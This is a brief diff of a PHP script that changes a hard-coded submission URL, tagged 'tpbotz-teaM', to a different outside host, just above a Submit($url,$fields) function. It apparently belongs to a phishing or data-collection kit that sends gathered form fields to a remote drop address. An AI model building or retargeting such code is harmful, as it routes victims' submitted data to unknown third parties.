@@ -1,6 +1,6 @@
 <?php
 $data=array('by'=>'tpbotz-teaM',
-           'url'=>'http://tpbotz-nelsa.tk/getData.php',
+           'url'=>'http://ombhard.com',
             );
 
 function Submit($url,$fields)
